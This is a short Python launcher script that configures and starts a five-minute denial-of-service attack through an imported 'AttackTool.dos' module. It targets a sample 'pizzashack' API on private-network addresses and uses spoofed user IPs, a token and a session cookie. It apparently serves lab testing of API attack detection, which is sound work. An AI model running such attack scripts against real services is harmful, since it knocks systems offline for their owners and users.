from AttackTool import dos
from AttackTool.dos import User
from AttackTool.dos import API
from AttackTool.dos import DOSAttackData
from datetime import datetime


if __name__ == "__main__":
    attack_duration = 5 * 60
    url = "http://10.100.8.34:9000"
    ip_list = ['169.185.105.92']
    user_data = [['169.185.105.92', 'bbf9a4b5-fe8f-3194-bfb7-afc511f0d89b', 'JSESSIONID=3k3pfs52tqdkvd16gpvkc4c5dfurwiq']]  # ip,token,cookie

    api = API("https", "172.17.0.1", "8243", "pizzashack", "1.0.0", "Maps")
    api.add_resource("GET", "menu")
    api.add_resource("POST", "order")
    attack_instance = DOSAttackData(api, ip_list)
    attack_instance.useragent_list()
    attack_instance.parse_users(user_data)

    print(datetime.now())
    dos.attack()
